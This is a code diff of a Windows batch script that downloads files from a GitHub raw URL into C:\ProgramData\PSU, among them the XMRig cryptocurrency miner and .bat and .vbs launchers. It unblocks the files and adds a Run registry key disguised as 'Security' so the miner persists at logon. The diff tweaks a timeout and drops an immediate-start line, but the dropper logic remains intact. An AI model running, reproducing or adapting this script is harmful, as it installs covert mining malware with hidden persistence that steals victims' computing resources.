@@ -10,9 +10,8 @@ curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/execute.txt
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/process.txt" -o "C:\ProgramData\PSU\process.bat" >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/start.txt" -o "C:\ProgramData\PSU\start.vbs" >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/xmrig.txt" -o "C:\ProgramData\PSU\xmrig.exe" >> nul
-timeout 0 >> nul
+timeout 1 >> nul
 powershell.exe Unblock-File -Path "*"
 powershell.exe Unblock-File -Path "C:\ProgramData\PSU\*"
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
-start "" "C:\ProgramData\PSU\start.vbs"
 exit
